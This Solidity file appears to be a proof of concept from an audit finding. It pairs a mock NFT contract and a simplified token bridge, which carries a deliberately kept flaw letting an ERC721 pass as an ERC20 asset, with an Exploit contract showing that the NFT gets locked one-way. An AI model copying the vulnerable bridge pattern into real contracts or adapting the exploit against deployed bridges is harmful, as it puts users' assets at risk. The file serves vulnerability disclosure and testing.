// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IERC721Like { function transferFrom(address from, address to, uint256 tokenId) external; }

contract MockERC721 {
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => address) public getApproved;
    function mint(address to, uint256 id) external { ownerOf[id] = to; }
    function approve(address operator, uint256 id) external { require(ownerOf[id] == msg.sender); getApproved[id] = operator; }
    function transferFrom(address from, address to, uint256 id) external {
        require(ownerOf[id] == from && (msg.sender == from || getApproved[id] == msg.sender));
        ownerOf[id] = to; getApproved[id] = address(0);
    }
}

contract TokenBridge {
    mapping(address => mapping(address => uint256)) public l2Balance;
    // A reduced form of the pre-fix ERC20 bridge entrypoint. ERC721's similarly
    // shaped transferFrom satisfies it, so tokenId is treated as an ERC20 amount.
    function bridgeToken(address token, uint256 amount, address recipient) external {
        IERC721Like(token).transferFrom(msg.sender, address(this), amount); // @> VULN: an ERC721 is accepted as an ERC20 bridge asset and becomes one-way.
        l2Balance[token][recipient] += 1;
    }
    function bridgeBack(address, uint256, address) external pure { revert("SafeERC20: low-level call failed"); }
}

contract Exploit {
    MockERC721 public nft; // CREATE nonce 1
    TokenBridge public bridge; // CREATE nonce 2
    uint256 public constant TOKEN_ID = 5;
    constructor() { nft = new MockERC721(); bridge = new TokenBridge(); }
    function run() external {
        nft.mint(address(this), TOKEN_ID);
        nft.approve(address(bridge), TOKEN_ID);
        bridge.bridgeToken(address(nft), TOKEN_ID, address(this));
        require(nft.ownerOf(TOKEN_ID) == address(bridge), "nft not locked");
        require(bridge.l2Balance(address(nft), address(this)) == 1, "no fake fungible representation");
        try bridge.bridgeBack(address(nft), 1, address(this)) {} catch {}
        require(nft.ownerOf(TOKEN_ID) == address(bridge), "nft unexpectedly returned");
    }
}
